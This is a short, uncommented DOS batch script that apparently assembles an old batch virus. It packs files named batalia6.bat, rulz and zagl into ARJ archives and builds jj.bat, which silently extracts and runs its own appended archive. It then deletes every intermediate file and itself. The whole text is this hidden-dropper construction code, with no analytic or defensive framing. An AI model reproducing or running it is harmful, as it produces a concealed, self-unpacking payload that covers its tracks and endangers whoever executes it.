@echo off
arj a bufer rulz batalia6.bat jj.bat zagl final.bat
copy rulz a.bat
copy /b a.bat+bufer.arj
arj a buf a.bat
echo @echo off >jj.bat
echo %comspec% nul /carj x %%0 >>jj.bat
echo a %%0 >>jj.bat
copy /b jj.bat+buf.arj
del rulz
del batalia6.bat
del bufer.arj
del buf.arj
del a.bat
del zagl
del final.bat
del %0